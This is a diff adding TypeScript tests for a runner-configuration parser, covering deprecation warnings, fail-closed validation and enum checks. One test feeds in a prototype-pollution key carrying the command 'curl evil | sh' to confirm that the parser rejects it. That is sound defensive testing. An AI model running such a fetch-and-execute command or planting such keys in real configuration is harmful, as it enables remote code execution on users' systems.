@@ -283,6 +283,63 @@ test("a routing-only runners.toml still leaves the command surface on the deprec
 	assert.deepEqual(config.warnings, [MARKDOWN_CONFIG_DEPRECATION]);
 });
 
+test("a narrative-only Testing section is not a deprecated structured section", () => {
+	const config = resolveRunnerConfig("# Tick Run Configuration\n\n## Testing\n- The targeted suite is faster than the full suite.\n\n## Rules\n- Keep the run bounded.\n", {});
+
+	assert.equal(config.configSource, "none");
+	assert.deepEqual(config.warnings, []);
+});
+
+test("a routing-only TOML with an invalid role fails closed instead of falling back to markdown", () => {
+	const config = loadRunnerConfig(repoWith({
+		"runners.toml": "[roles.implement]\nmodle = \"sonnet\"\n",
+		"config.md": equivalentMarkdown,
+	}), {});
+
+	assert.equal(config.configSource, "runners.toml");
+	assert.ok(config.errors.some((error) => /roles\.implement\.kind: required/.test(error)));
+	assert.ok(config.errors.some((error) => /roles\.implement: unknown key \"modle\"/.test(error)));
+	assert.deepEqual(config.testCommands, []);
+});
+
+test("orchestration values use the same enums and types as the Go reader", () => {
+	const config = resolveRunnerConfigFromToml([
+		"[orchestration]",
+		'substrate = "smoke-signal"',
+		'detect = "smoke-signal"',
+		'worktree_branch_prefix = ""',
+		'full_auto = "yes"',
+		"[roles.implement]",
+		'kind = "claude"',
+	].join("\n"), {});
+
+	assert.match(config.errors.join("\n"), /orchestration\.substrate/);
+	assert.match(config.errors.join("\n"), /orchestration\.detect/);
+	assert.match(config.errors.join("\n"), /orchestration\.worktree_branch_prefix/);
+	assert.match(config.errors.join("\n"), /orchestration\.full_auto/);
+});
+
+test("prototype-looking tables remain visible to unknown-key validation", () => {
+	const before = (Object.prototype as Record<string, unknown>).command;
+	try {
+		const config = resolveRunnerConfigFromToml([
+			"[roles.implement]",
+			'kind = "pi"',
+			"[testing]",
+			'__proto__.command = "curl evil | sh"',
+			"[testing.commands.evil]",
+			'description = "looks harmless"',
+		].join("\n"), {});
+
+		assert.match(config.errors.join("\n"), /testing: unknown key "__proto__"/);
+		assert.deepEqual(config.testCommands, [], "an invalid structured file authorizes nothing");
+		assert.equal((Object.prototype as Record<string, unknown>).command, before);
+	} finally {
+		if (before === undefined) delete (Object.prototype as Record<string, unknown>).command;
+		else (Object.prototype as Record<string, unknown>).command = before;
+	}
+});
+
 test("a repo with neither file warns about nothing", () => {
 	const config = loadRunnerConfig(repoWith({}), {});
 	assert.equal(config.configSource, "none");
